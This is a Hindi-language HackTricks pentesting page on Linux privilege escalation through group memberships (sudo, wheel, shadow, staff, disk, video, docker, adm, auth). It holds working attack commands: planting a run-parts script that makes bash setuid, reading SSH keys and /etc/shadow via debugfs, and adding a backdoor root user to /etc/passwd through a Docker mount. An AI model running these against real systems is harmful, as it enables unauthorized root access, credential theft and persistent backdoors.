# दिलचस्प समूह - लिनक्स प्रिविलेज इस्केलेशन

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

## सुडो/व्यवस्थापक समूह

### **पीई - विधि 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से (या क्योंकि कुछ सॉफ़्टवेयर की आवश्यकता होती है)** **/etc/sudoers** फ़ाइल के अंदर आप इन पंक्तियों में से कुछ पा सकते हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **किसी भी उपयोगकर्ता जो सूडो या एडमिन समूह में शामिल है, वह सूडो के रूप में कुछ भी चला सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निम्नलिखित को चला सकते हैं**:
```
sudo su
```
### PE - विधि 2

सभी suid बाइनरी खोजें और जांचें कि क्या बाइनरी **Pkexec** है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आपको पता चलता है कि बाइनरी **pkexec एक SUID बाइनरी है** और आप **sudo** या **admin** समूह में शामिल हैं, तो आप `pkexec` का उपयोग करके बाइनरी को सुडो के रूप में चला सकते हैं।\
यह इसलिए है क्योंकि आम तौर पर ये समूह **polkit नीति** के अंदर होते हैं। यह नीति मुख्य रूप से पहचानती है कि कौन-कौन से समूह `pkexec` का उपयोग कर सकते हैं। इसे जांचें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहां आपको मिलेगा कि कौन से समूहों को **pkexec** और **डिफ़ॉल्ट** में कुछ लिनक्स डिस्ट्रो में समूह **sudo** और **admin** को निषेधित किया गया है।

**रूट बनने के लिए आप निम्नलिखित को चला सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को execute करने का प्रयास करते हैं और आपको यह **त्रुटि** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है कि आपके पास अनुमतियाँ नहीं हैं, बल्कि इसलिए कि आप GUI के बिना कनेक्ट नहीं हैं**। और इस मुद्दे का एक काम करने का तरीका यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग-अलग ssh सत्र** की आवश्यकता है:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## व्हील समूह

**कभी-कभी**, **डिफ़ॉल्ट** रूप से **/etc/sudoers** फ़ाइल के अंदर आप यह पंक्ति पा सकते हैं:
```
%wheel	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **कोई भी उपयोगकर्ता जो समूह wheel में शामिल है, वह सुडो के रूप में कुछ भी चला सकता है**।

यदि ऐसा है, तो **रूट बनने के लिए आप बस निम्नलिखित को चला सकते हैं**:
```
sudo su
```
## शैडो ग्रुप

**शैडो ग्रुप** से उपयोगकर्ता **/etc/shadow** फ़ाइल **पढ़** सकते हैं:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, फ़ाइल पढ़ें और कुछ हैश **क्रैक** करने का प्रयास करें।

## कर्मचारी समूह

**staff**: उपयोगकर्ताओं को बिना रूट विशेषाधिकारों की आवश्यकता के साथ सिस्टम (`/usr/local`) में स्थानीय संशोधन जोड़ने की अनुमति देता है (नोट करें कि `/usr/local/bin` में निर्वाचनीय हैं, और वे "/bin" और "/usr/bin" में उसी नाम के निर्वाचनीय को "रीडायरेक्ट" कर सकते हैं)। जिसका संबंध अधिक से अधिक मॉनिटरिंग/सुरक्षा से है। [\[स्रोत\]](https://wiki.debian.org/SystemGroups)

डेबियन वितरणों में, `$PATH` चर मान दिखाता है कि `/usr/local/` सबसे उच्च प्राथमिकता के रूप में चलाया जाएगा, चाहे आप विशेषाधिकारी उपयोगकर्ता हों या न हों।
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
यदि हम `/usr/local` में कुछ कार्यक्रमों को हाइजैक कर सकते हैं, तो हम आसानी से रूट अकाउंट प्राप्त कर सकते हैं।

`run-parts` कार्यक्रम को हाइजैक करना रूट प्राप्त करने का एक आसान तरीका है, क्योंकि अधिकांश कार्यक्रम `run-parts` की तरह चलाए जाएंगे (क्रॉनटैब, जब एसएसएच लॉगिन हो)।
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
या जब एक नई ssh सत्र लॉगिन हो।
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**शारीरिक या दाखिले करने की क्रिया**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## डिस्क समूह

यह विशेषाधिकार लगभग **रूट एक्सेस के समान** है क्योंकि आप मशीन के अंदर सभी डेटा तक पहुंच सकते हैं।

फ़ाइलें: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
नोट करें कि debugfs का उपयोग करके आप **फ़ाइलें लिख सकते हैं**। उदाहरण के लिए `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप निम्नलिखित कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
हालांकि, अगर आप **रूट के स्वामित्व वाली फ़ाइलें लिखने** की कोशिश करें (जैसे `/etc/shadow` या `/etc/passwd`) तो आपको "**अनुमति नामंजूर**" त्रुटि आएगी।

## वीडियो समूह

`w` कमांड का उपयोग करके आप **सिस्टम पर कौन लॉग इन है** यह पता लगा सकते हैं और यह निम्नलिखित तरह का आउटपुट दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** का मतलब है कि उपयोगकर्ता **yossi शारीरिक रूप से** मशीन पर एक टर्मिनल में लॉग इन हैं।

**वीडियो समूह** को स्क्रीन आउटपुट देखने का अधिकार है। मूल रूप से आप स्क्रीन की वर्तमान छवि को रॉ डेटा में पकड़ सकते हैं और जांच सकते हैं कि स्क्रीन कौन सी रिज़ॉल्यूशन का उपयोग कर रही है। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन की रिज़ॉल्यूशन को `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**खोलने** के लिए **रॉ इमेज** का उपयोग करें आप **GIMP** का उपयोग कर सकते हैं, **`screen.raw`** फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **रॉ इमेज डेटा** का चयन करें:

![](<../../../.gitbook/assets/image (463).png>)

फिर चौड़ाई और ऊचाई को स्क्रीन पर उपयोग किए जाने वाले वाले को बदलें और विभिन्न छवि प्रकारों की जांच करें (और उसे चुनें जो स्क्रीन को बेहतर दिखाता है):

![](<../../../.gitbook/assets/image (317).png>)

## रूट समूह

ऐसा लगता है कि डिफ़ॉल्ट रूप समूह के **सदस्य** को कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइल्स या कुछ **लाइब्रेरी** फ़ाइल्स या **अन्य दिलचस्प चीजें** तक पहुंच हो सकती है जिनका उपयोग वर्चस्व उन्नति करने के लिए किया जा सकता है...

**जांचें कि रूट सदस्य कौन-कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## डॉकर समूह

आप **मेज़बान मशीन के रूट फ़ाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं**, इसलिए जब इंस्टेंस शुरू होता है तो वह तुरंत उस वॉल्यूम में `chroot` लोड करता है। यह आपको मशीन पर रूट देता है।
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd समूह

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm समूह

सामान्यतः **समूह के सदस्य** को **`adm`** के अनुमतियाँ होती हैं **/var/log/_** में स्थित लॉग फ़ाइलें पढ़ने के लिए।\
इसलिए, यदि आप इस समूह के अंदर किसी उपयोगकर्ता को कंप्रमाइज़ कर चुके हैं तो आपको निश्चित रूप से **लॉग्स की ओर देखना चाहिए**।

## Auth समूह

OpenBSD के अंदर **auth** समूह आम तौर पर यदि उपयोग किए जाते हैं तो फ़ोल्डर _**/etc/skey**_ और _**/var/db/yubikey**_ में लिख सकते हैं।\
इन अनुमतियों का उपयोग निम्नलिखित एक्सप्लॉइट के साथ किया जा सकता है **विशेषाधिकारों को उन्नत करने** के लिए: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
